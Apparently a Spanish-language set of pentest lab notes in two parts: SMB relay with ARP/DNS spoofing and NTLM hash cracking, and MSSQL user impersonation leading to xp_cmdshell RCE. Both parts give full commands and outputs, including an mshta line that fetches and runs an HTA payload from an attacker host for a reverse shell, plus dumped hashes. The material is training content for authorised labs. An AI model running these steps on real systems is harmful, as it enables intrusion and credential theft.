
# Explotación en Windows

## <mark style="color:purple;">SMB Relay Attack</mark>

Es un ataque donde:

👉 Interceptamos una autenticación NTLM\
👉 Y la **reenvíamos (relay)** a otro servicio SMB\
👉 Para autenticarse **sin conocer la contraseña**

💡 No crackeas credenciales → las reutilizas en tiempo real

#### Requisitos

Para que funcione:

* ❌ SMB Signing deshabilitado
* 👤 La víctima se autentica contra ti
* 🌐 Estás en la misma red (MITM)

#### Flujo del ataque

1. Capturas autenticación NTLM
2. La relayas a otro host SMB
3. Obtienes acceso (shell / ejecución)

#### Herramientas

* `impacket-ntlmrelayx` 🔥 (principal)
* `responder` (captura hashes)
* `mitm6` (IPv6 attacks)

***

### Explotación paso a paso

#### 1. Verificar SMB signing

```bash
nmap -p445 --script smb2-security-mode <IP>
```

👉 Si:

```bash
message_signing: disabled
```

→ vulnerable 🔥

***

#### 2. Preparar targets

```bash
echo 172.16.5.5 > targets.txt
```

***

#### 3. Lanzar ntlmrelayx

Con ejecución directa:

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

Obtener shell:

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support --interactive
```

***

#### 4. Forzar autenticación (Responder)

```bash
responder -I eth0
```

👉 Captura conexiones SMB/HTTP

***

### Alternativa más potente: Metasploit SMB Relay

#### Habilitamos el servidor

```bash
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST <IP-Kali>
set LHOST <IP-Kali>
set SMBHOST <IP-Objetivo>

msf6 exploit(windows/smb/smb_relay) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.5.101:4444 
[*] Started service listener on 172.16.5.101:445 
msf6 exploit(windows/smb/smb_relay) > [*] Server started.
```

#### Configurar Man in the Middle

```bash
echo "<IP-Kali> *.domain.com" > dns
```

```bash
dnsspoof -i eth1 -f dns
```

#### Habilitar IP Forwarding

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

#### ARP Spoofing

En una terminal:

```bash
arpspoof -i eth1 -t <IP-Objetivo> <IP-Gateway>
```

En otra terminal hacemos lo mismo a la inversa:

```bash
arpspoof -i eth1 -t <IP-Gateway> <IP-Objetivo>
```

#### Recibimos el Meterpreter

{% code overflow="wrap" %}

```bash
msf6 exploit(windows/smb/smb_relay) > 
[*] Sending NTLMSSP NEGOTIATE to 172.16.5.10
[*] Extracting NTLMSSP CHALLENGE from 172.16.5.10
[*] Forwarding the NTLMSSP CHALLENGE to 172.16.5.5:49158
[*] Extracting the NTLMSSP AUTH resolution from 172.16.5.5:49158, and sending Logon Failure response
[*] Forwarding the NTLMSSP AUTH resolution to 172.16.5.10
[+] SMB auth relay against 172.16.5.10 succeeded
[*] Connecting to the defined share...
[*] Regenerating the payload...
[*] Uploading payload...
[*] Created \pWKwgGql.exe...
[*] Connecting to the Service Control Manager...
[*] Obtaining a service manager handle...
[*] Creating a new service...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Closing service handle...
[*] Deleting \pWKwgGql.exe...
[*] Sending stage (175174 bytes) to 172.16.5.10
[*] Meterpreter session 1 opened (172.16.5.101:4444 -> 172.16.5.10:49158) at 2022-01-21 19:25:07 -0500
```

{% endcode %}

***

### Lab: DNS & SMB Relay

Te ha contratado una pequeña empresa para realizar una evaluación de seguridad. Tu cliente es sportsfoo.com y necesita tu ayuda para probar la seguridad de su entorno, según el alcance que se detalla a continuación:

Los supuestos de este proyecto de seguridad son:

Realizarás una prueba de penetración interna, conectándote directamente a su red LAN `172.16.5.0/24`. El alcance de esta prueba se limita al segmento `172.16.5.0/24`.

Te encuentras en una red de producción, por lo que no debes bloquear ninguna cuenta de usuario adivinando sus nombres de usuario y contraseñas.

La siguiente imagen representa el entorno de laboratorio:

<figure><img src="/files/j4nCq46bLrLITUKwQJOt" alt=""><figcaption></figcaption></figure>

#### Objetivos

* Explotación mediante el ataque de SMB Relay
* Manipulación del tráfico de red con `dnsspoof`

#### Lo que aprenderás

* Cómo usar el ataque `SMB Relay` para comprometer hosts con parches de seguridad.
* Cómo usar la herramienta `dnsspoof` para redirigir sistemas al host que controlas.

#### Tarea

Lanza un ataque utilizando el exploit SMB Relay de forma que, una vez que el cliente (`172.16.5.5`) establezca una conexión SMB con cualquier host del dominio `.sportsfoo.com`, esta se redirija a tu servidor Metasploit. Posteriormente, podrás usar sus credenciales para obtener acceso a la máquina objetivo (`172.16.5.10*`).

Esta imagen ilustra cómo debería funcionar este ataque:

<figure><img src="/files/hYCf5s4JGh4c19BVRZ9T" alt=""><figcaption></figcaption></figure>

***

#### Escaneo de red interna

```bash
┌──(rootkali)-[~]
└─# nmap -sn 172.16.5.0/24  

Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-21 19:05 EST
Nmap scan report for 172.16.5.1
Host is up (0.00039s latency).
MAC Address: 0A:00:27:00:00:03 (Unknown)
Nmap scan report for 172.16.5.5
Host is up (0.00068s latency).
MAC Address: 08:00:27:8F:79:CC (Oracle VirtualBox virtual NIC)
Nmap scan report for 172.16.5.10
Host is up (0.00073s latency).
MAC Address: 08:00:27:7F:4F:D8 (Oracle VirtualBox virtual NIC) -> Nuestro Kali
Nmap scan report for 172.16.5.101
```

#### Verificar SMB signing

```bash
┌──(rootkali)-[~]
└─# nmap -p445 --script smb2-security-mode 172.16.5.10
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-21 19:46 EST
Nmap scan report for 172.16.5.10
Host is up (0.0012s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:7F:4F:D8 (Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
```

Está habilitado pero no requerido, por lo que lo podríamos explotar en principio.

#### Configurar SMB Relay

```bash
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101  # La IP de nuestro Kali
set LHOST 172.16.5.101    # La IP de nuestro Kali
set SMBHOST 172.16.5.10   # La IP del objetivo

msf6 exploit(windows/smb/smb_relay) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.5.101:4444 
[*] Started service listener on 172.16.5.101:445 
msf6 exploit(windows/smb/smb_relay) > [*] Server started.
```

Una vez iniciado el servidor necesitamos redirigir al objetivo a nuestro Kali.

#### Configurar Man in the Middle

```bash
echo "172.16.5.101 *.sportsfoo.com" > dns
```

```bash
dnsspoof -i eth1 -f dns

dnsspoof: listening on eth1 [udp dst port 53 and not src 172.16.5.101]
```

#### Habilitar IP Forwarding

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

#### ARP Spoofing

```bash
┌──(rootkali)-[~]
└─# arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
...
```

Y en otra terminal hacemos lo mismo a la inversa:

```bash
──(rootkali)-[~]
└─# arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
...
```

#### Recibimos el Meterpreter

{% code overflow="wrap" %}

```bash
msf6 exploit(windows/smb/smb_relay) > 
[*] Sending NTLMSSP NEGOTIATE to 172.16.5.10
[*] Extracting NTLMSSP CHALLENGE from 172.16.5.10
[*] Forwarding the NTLMSSP CHALLENGE to 172.16.5.5:49158
[*] Extracting the NTLMSSP AUTH resolution from 172.16.5.5:49158, and sending Logon Failure response
[*] Forwarding the NTLMSSP AUTH resolution to 172.16.5.10
[+] SMB auth relay against 172.16.5.10 succeeded
[*] Connecting to the defined share...
[*] Regenerating the payload...
[*] Uploading payload...
[*] Created \pWKwgGql.exe...
[*] Connecting to the Service Control Manager...
[*] Obtaining a service manager handle...
[*] Creating a new service...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Closing service handle...
[*] Deleting \pWKwgGql.exe...
[*] Sending stage (175174 bytes) to 172.16.5.10
[*] Meterpreter session 1 opened (172.16.5.101:4444 -> 172.16.5.10:49158) at 2022-01-21 19:25:07 -0500
```

{% endcode %}

{% code overflow="wrap" %}

```bash
msf6 exploit(windows/smb/smb_relay) > sessions

Active sessions
===============

  Id  Name  Type                     Information                       Connection
  --  ----  ----                     -----------                       ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ FILESERVER  172.16.5.101:4444 -> 172.16.5.10:49158 (172.16.5.10)

msf6 exploit(windows/smb/smb_relay) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

{% endcode %}

#### Dumpeo de hashes

{% code overflow="wrap" %}

```bash
meterpreter > hashdump
admin:1005:aad3b435b51404eeaad3b435b51404ee:179699ef43d4b9ba2f8f615f59893917:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
aline:1004:aad3b435b51404eeaad3b435b51404ee:bf4c3092a586df1a9137a4f5737bdc94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

{% endcode %}

Estos hashes los podemos crackear fácilmente con John, Hashcat o Crackstation, muy útil si tenemos un montón de hashes:

{% embed url="<https://crackstation.net/>" %}

<figure><img src="/files/GR5DdK7aqviBdL68aqj9" alt=""><figcaption></figcaption></figure>

#### Alternativa: Responder para capturar hashes

```bash
responder -I eth0
```

{% code overflow="wrap" %}

```powershell
[+] Listening for events...                                                                                                                                             

[WebDAV] NTLMv2 Client   : 172.16.5.5
[WebDAV] NTLMv2 Username : domain\aline
[WebDAV] NTLMv2 Hash     : aline::domain:0eafdb81f548c333:7CB7E62E4A88E65FD8D7BE3041052761:01010000000000004494678D260FD801F5C8EE3A6E4387D30000000002000800460038004F00310001001E00570049004E002D004B005A004D004400560037003100420056004D00410004001400460038004F0031002E004C004F00430041004C0003003400570049004E002D004B005A004D004400560037003100420056004D0041002E00460038004F0031002E004C004F00430041004C0005001400460038004F0031002E004C004F00430041004C000800300030000000000000000100000000200000CE0E3CF4BB9FA2899D3BD4FD6F1E51406393CB6BE5FD6915D615B63C3BA474200A0010000000000000000000000000000000000009003A0048005400540050002F00660069006C0065007300650072007600650072002E00730070006F0072007400730066006F006F002E0063006F006D000000000000000000
```

{% endcode %}

#### Crackeo de hash NET NTLM

{% code overflow="wrap" %}

```bash
echo "aline::domain:0eafdb81f548c333:7CB7E62E4A88E65FD8D7BE3041052761:01010000000000004494678D260FD801F5C8EE3A6E4387D30000000002000800460038004F00310001001E00570049004E002D004B005A004D004400560037003100420056004D00410004001400460038004F0031002E004C004F00430041004C0003003400570049004E002D004B005A004D004400560037003100420056004D0041002E00460038004F0031002E004C004F00430041004C0005001400460038004F0031002E004C004F00430041004C000800300030000000000000000100000000200000CE0E3CF4BB9FA2899D3BD4FD6F1E51406393CB6BE5FD6915D615B63C3BA474200A0010000000000000000000000000000000000009003A0048005400540050002F00660069006C0065007300650072007600650072002E00730070006F0072007400730066006F006F002E0063006F006D000000000000000000" > hash.txt
```

{% endcode %}

{% code overflow="wrap" %}

```bash
┌──(rootkali)-[~]
└─# john --format=netntlmv2 hash.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
soccer           (aline)
```

{% endcode %}

Obtenemos la contraseña en plano del usuario Alice.

***

## <mark style="color:purple;">MSSQL DB User Impersonation to RCE</mark>

Es una técnica donde:

👉 Aprovechas permisos de **impersonación en SQL Server**\
👉 Para actuar como otro usuario (más privilegiado)\
👉 Y escalar hasta ejecutar comandos en el sistema (**RCE = Remote Code Execution**)

***

#### Concepto clave: IMPERSONATE

En MSSQL existe el permiso:

```
IMPERSONATE
```

Que te termite hacer:

```
EXECUTE AS LOGIN = 'sa'
```

👉 Básicamente:

* te conviertes en otro usuario
* sin conocer su contraseña

#### Flujo del ataque

1. Acceso a MSSQL (usuario limitado)
2. Descubres que puedes **impersonar otro usuario**
3. Escalas privilegios (ej: `sa`)
4. Habilitas ejecución de comandos
5. Ejecutas código en el sistema (RCE)

***

### Explotación paso a paso

#### 1. Escaneo dirigido con scripts

```bash
nmap -sV -p 1433 --script ms-sql-* <IP>
```

#### 2. Acceso a MS-SQL

```bash
impacket-mssqlclient user:pass@target
```

#### 3. Ver si tenemos permisos sysadmin

```sql
SQL (bob  guest@master)> select loginname from syslogins where sysadmin = 1;

loginname   
---------   
sa  
```

#### 4. Ver usuarios que puedes impersonar

```sql
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
```

{% code overflow="wrap" %}

```sql
select distinct b.name from sys.server_permissions a INNER JOIN sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'IMPERSONATE';
```

{% endcode %}

#### 5. Cambiar de usuario

```sql
EXECUTE AS LOGIN = 'sa';
```

Ver quién eres ahora:

```sql
SELECT SYSTEM_USER;
```

#### 6. Habilitar ejecución de comandos (xp\_cmdshell)

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### 7. Ejecutar comandos (RCE)

```sql
EXEC xp_cmdshell 'whoami';
```

#### 8. Reverse Shell

{% code overflow="wrap" %}

```bash
msfconsole
use exploit/windows/misc/hta_server
exploit

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.37.6:4444 
[*] Using URL: http://10.10.37.6:8080/sVm4o1L.hta
[*] Server started.
```

{% endcode %}

{% code overflow="wrap" %}

```sql
SQL (sa  dbo@master)> exec xp_cmdshell "mshta.exe http://10.10.37.6:8080/sVm4o1L.hta"
```

{% endcode %}

Y recibimos la shell en Metasploit:

```bash
[*] 10.2.23.220      hta_server - Delivering Payload
[*] Sending stage (176198 bytes) to 10.2.23.220
[*] Meterpreter session 1 opened (10.10.37.6:4444 -> 10.2.23.220:57312) at 2026-03-24 00:38:52 +0530
```

```bash
msf6 exploit(windows/misc/hta_server) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT Service\MSSQL$SQLEXPRESS
```

***

### Lab

Se le proporciona una máquina Kali GUI y una máquina de destino que ejecuta un servicio MSSQL. El usuario accederá al servidor Windows implementado en `http://demo.ine.local`.

Tu tarea consiste en identificar el servicio MSSQL utilizando las herramientas disponibles en Kali. A continuación, usa mssqlclient.py para conectarte al servicio MSSQL remoto, realizar una escalada de privilegios de usuario de la base de datos y obtener acceso al shell de la máquina objetivo.

Ruta de escalada de privilegios: `bob -> dbuser -> sa`

**Objetivo**: ¡Explotar el servidor y recuperar la flag!

Para acceder al servicio, puede utilizar el siguiente nombre de usuario y contraseña:

{% code overflow="wrap" %}

```
bob:KhyUuxwp7Mcxo7
```

{% endcode %}

***

#### Hosts

{% code overflow="wrap" %}

```bash
┌──(root㉿attackdefense)-[~]
└─# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.13       attackdefense.com attackdefense
10.10.37.6      attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.2.23.220    demo.ine.local
```

{% endcode %}

Nuestro objetivo es `demo.ine.local`.

#### Escaneo de puertos

{% code overflow="wrap" %}

```bash
┌──(root㉿attackdefense)-[~]
└─# nmap -sV demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-24 00:06 IST
Nmap scan report for demo.ine.local (10.2.23.220)
Host is up (0.0034s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-23 18:36:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: CONTOSO)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: MSSQL-SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

{% endcode %}

Tenemos MS-SQL en el puerto 1433. Vamos a enumerarlo en detalle.

#### Escaneo dirigido con scripts

```bash
┌──(root㉿attackdefense)-[~]
└─# nmap -sV -p 1433 --script ms-sql-* demo.ine.local    
                                                                                                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-24 00:08 IST
Nmap scan report for demo.ine.local (10.2.23.220)
Host is up (0.0028s latency).

Bug in ms-sql-dac: no string output.
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-brute: 
|   10.2.23.220:1433: 
| [10.2.23.220:1433]
|   Credentials found:
|_    admin:anamaria => Login Success
| ms-sql-ntlm-info: 
|   10.2.23.220:1433: 
|     Target_Name: CONTOSO
|     NetBIOS_Domain_Name: CONTOSO
|     NetBIOS_Computer_Name: MSSQL-SERVER
|     DNS_Domain_Name: contoso.local
|     DNS_Computer_Name: MSSQL-Server.contoso.local
|     DNS_Tree_Name: contoso.local
|_    Product_Version: 10.0.14393
| ms-sql-query: 
|_  (Use --script-args=ms-sql-query.query='<QUERY>' to change query.)
| ms-sql-dump-hashes: 
|   10.2.23.220:1433: 
|     sa:0x0200c69f689fc2b06d50993bd23c5deadb9da476967decd8501cd8f0627b8b997adba2a2cd9751573ace03bff0a3643c8b75aa1c50433a23534c32f1a1e06237b04fdc1b8b40
|     ##MS_PolicyEventProcessingLogin##:0x0200191cf079f310fb475527ac320aba7a4e8d5c3567bef2462b96ce8a8629b7f986ed344aa0963ac3a096da77056dad77a457644431282e2aa2c2243bc635abc6bb5f52552c
|     ##MS_PolicyTsqlExecutionLogin##:0x0200677385acfe08bb1119246cf20f9d17c3a0d86bbb1d48874725f2c2e0e021260b885d0ba067427e09afad9079e6759ad6497ee7f1ef3cd497d500585d7727eeba64426083
|     dbadmin:0x02001d7af4a85fb776076813f7959fd95ef92bf26c8cf8d8d84ef8004fc000eec4c33a0c1a0dfaf7cf4dec178aec2f0d49a5c25f7b53fc483b4e2ded1ba88b7521bba1c2788b
|     auditor:0x0200da4dc07649fd43417fb6e0f68cc510c7b2250e0fb97df8ffa132fccbb1c6f01b1b9f572892629a9a99cef8bf43e2ecf8d6823e88ff63acb14051438e0282897b7c414473
|     admin:0x0200a42261271bd38f007ab2e66c407dab9a956d4d12bf9872cd185c0f630df3a7cdb4b3b503bad638328cbb47bbabbb7f06afbe7d25ce660ee78af394234bbe444783af55a9
|     bob:0x0200eef90e749a5fac46b598605fe79f9c5a5091bc37826614a9823ea7a5e48a613f44f9de4a7d11664ee8517233d9537f90af4fe1131d61bc6fc5607d0a645cf275899dfb71
|_    dbuser:0x0200f83976ddb1b99281b83fed944124174285ac2a7dfadf45f13a9d1302f9eb83f062ef362b4da2cfa1f9ac9b701098d57fc42bd2faca0b6d2f29871d0efca76354f5be5173
| ms-sql-info: 
|   10.2.23.220:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-xp-cmdshell: 
|_  (Use --script-args=ms-sql-xp-cmdshell.cmd='<CMD>' to change command.)
|_ms-sql-config: ERROR: Script execution failed (use -d to debug)
| ms-sql-empty-password: 
|_  10.2.23.220:1433: 
|_ms-sql-tables: ERROR: Script execution failed (use -d to debug)
|_ms-sql-hasdbaccess: ERROR: Script execution failed (use -d to debug)
```

Obtenemos multitud de hashes

#### Acceso a MS-SQL

{% code overflow="wrap" %}

```bash
┌──(root㉿attackdefense)-[~]
└─# impacket-mssqlclient bob:KhyUuxwp7Mcxo7@demo.ine.local

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MSSQL-SERVER\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MSSQL-SERVER\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (bob  guest@master)>
```

{% endcode %}

#### Ver si somos sysadmin

```sql
SQL (bob  guest@master)> select loginname from syslogins where sysadmin = 1;
loginname   
---------   
sa    
```

Tenemos sysadmin, pero no podemos activar `xp_cmdshell` con este usuario:

```sql
SQL (bob  guest@master)> enable_xp_cmdshell
ERROR: Line 1: You do not have permission to run the RECONFIGURE statement.
```

#### Ver usuarios que podamos impersonar

{% code overflow="wrap" %}

```sql
SQL (bob  guest@master)> select distinct b.name from sys.server_permissions a INNER JOIN sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'IMPERSONATE';

name     
------   
sa
dbuser
```

{% endcode %}

#### Cambiar a usuario dbuser

{% code overflow="wrap" %}

```sql
SQL (bob  guest@master)> EXECUTE AS LOGIN = 'dbuser';
SQL (dbuser  guest@master)> SELECT SYSTEM_USER;
         
------   
dbuser
```

{% endcode %}

#### Impersonar a sysadmin

{% code overflow="wrap" %}

```sql
SQL (dbuser  guest@master)> EXECUTE AS LOGIN = 'sa';
SQL (sa  dbo@master)>
```

{% endcode %}

#### Habilitar xp\_cmdshell

{% code overflow="wrap" %}

```sql
SQL (sa  dbo@master)> enable_xp_cmdshell;
[*] INFO(MSSQL-SERVER\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(MSSQL-SERVER\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (sa  dbo@master)> RECONFIGURE
```

{% endcode %}

#### Ejecución de comandos

{% code overflow="wrap" %}

```sql
SQL (sa  dbo@master)> EXEC xp_cmdshell 'whoami';
output                        
---------------------------   
nt service\mssql$sqlexpress 
```

{% endcode %}

#### Reverse Shell

{% code overflow="wrap" %}

```bash
msfconsole
use exploit/windows/misc/hta_server
exploit

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.37.6:4444 
[*] Using URL: http://10.10.37.6:8080/sVm4o1L.hta
[*] Server started.
```

{% endcode %}

Nuestro servidor está en `http://10.10.37.6:8080/sVm4o1L.hta`

En MS-SQL ejecutamos lo siguiente:

{% code overflow="wrap" %}

```sql
SQL (sa  dbo@master)> exec xp_cmdshell "mshta.exe http://10.10.37.6:8080/sVm4o1L.hta"
```

{% endcode %}

Y recibimos la shell en Metasploit:

```bash
[*] 10.2.23.220      hta_server - Delivering Payload
[*] Sending stage (176198 bytes) to 10.2.23.220
[*] Meterpreter session 1 opened (10.10.37.6:4444 -> 10.2.23.220:57312) at 2026-03-24 00:38:52 +0530
```

```bash
msf6 exploit(windows/misc/hta_server) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                 Connection
  --  ----  ----                     -----------                                 ----------
  1         meterpreter x86/windows  NT Service\MSSQL$SQLEXPRESS @ MSSQL-SERVER  10.10.37.6:4444 -> 10.2.23.220:57312 (10.2.23.220)

msf6 exploit(windows/misc/hta_server) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT Service\MSSQL$SQLEXPRESS
```

#### Acceso a la flag

```powershell
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2021-01-20 12:39:32 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2016-07-16 18:48:08 +0530  BOOTNXT
040777/rwxrwxrwx  8192    dir   2021-01-14 03:13:36 +0530  Boot
040777/rwxrwxrwx  0       dir   2016-10-18 07:29:39 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2018-02-23 16:36:05 +0530  PerfLogs
040555/r-xr-xr-x  8192    dir   2021-03-25 10:41:30 +0530  Program Files
040777/rwxrwxrwx  8192    dir   2021-03-25 10:41:31 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2021-01-20 16:01:13 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2016-10-18 07:31:27 +0530  Recovery
040777/rwxrwxrwx  4096    dir   2021-03-25 10:12:25 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2021-01-20 12:47:14 +0530  Users
040777/rwxrwxrwx  28672   dir   2021-01-20 15:03:44 +0530  Windows
100444/r--r--r--  388688  fil   2021-01-08 06:11:36 +0530  bootmgr
100666/rw-rw-rw-  32      fil   2022-05-06 11:41:49 +0530  flag.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag.txt 
c5b7da8ca7d051749cd5d3e1e741ef91
```

#### Privesc y hashdump

```bash
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e58b314aaf7595c4c21e62ae64950fc:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
alice:1113:aad3b435b51404eeaad3b435b51404ee:7aa263ff83066e08faafeafa9eecb776:::
bob:1114:aad3b435b51404eeaad3b435b51404ee:7aa263ff83066e08faafeafa9eecb776:::
sysadmin:1115:aad3b435b51404eeaad3b435b51404ee:7aa263ff83066e08faafeafa9eecb776:::
MSSQL-SERVER$:1009:aad3b435b51404eeaad3b435b51404ee:b949185e790b8f1656190c272fa9bd2e:::
```
